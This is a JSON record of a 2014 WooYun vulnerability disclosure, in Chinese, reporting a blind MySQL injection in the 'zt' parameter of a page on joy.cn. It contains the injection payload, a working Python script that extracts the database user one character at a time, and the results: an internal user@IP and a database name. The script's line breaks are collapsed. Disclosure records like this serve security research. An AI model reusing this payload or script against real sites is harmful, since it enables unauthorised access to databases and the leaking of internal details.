{"id": 49492, "wybug_id": "wooyun-2014-083376", "wybug_title": "激动网主站MySQL注射(附验证脚本)", "wybug_corp": "激动网", "wybug_author": "lijiejie", "wybug_date": "2014-11-15 14:44", "wybug_open_date": "2014-11-20 14:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 激动网主站基于bool的MySQL注射。测试发现约10个sleep陷入，激动网带参数的页面就全挂了。 详细说明：  注入点：\nwww.joy.cn/special-page.jsp?zt=6' and length(user())=21 and '1'='1\n参数zt可注入。MySQL blind。    漏洞证明：  测试基于时间的盲注，大约10个sleep陷入，带参数的页面就全挂了。几行代码，猜解user()，得到：\nread_prog@10.10.30.17\n当前数据库：\nwapcms\npython脚本附上：\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {}payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')print 'Start to retrive MySQL User:'user = ''for i in range(1,30,1):    for payload in payloads:        conn = httplib.HTTPConnection('www.joy.cn', timeout=6)        s = \"6' and ascii(mid(user()from(%s)for(1)))=%s and '1'='1\" % (i, ord(payload))        conn.request(method='GET',                     url = \"/special-page.jsp?zt=\" + urllib.quote(s),                     headers=headers)        start_time = time.time()        html_doc = conn.getresponse().read().decode('utf-8')        conn.close()        if html_doc.find(u'东方爱民岗') > 0:            user += payload            print '\\n[Scan in progress]' + user            break        else:            print '.',print '\\n[Done]MySQL user is ' + user\n   修复方案：  参数过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-20 14:46 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}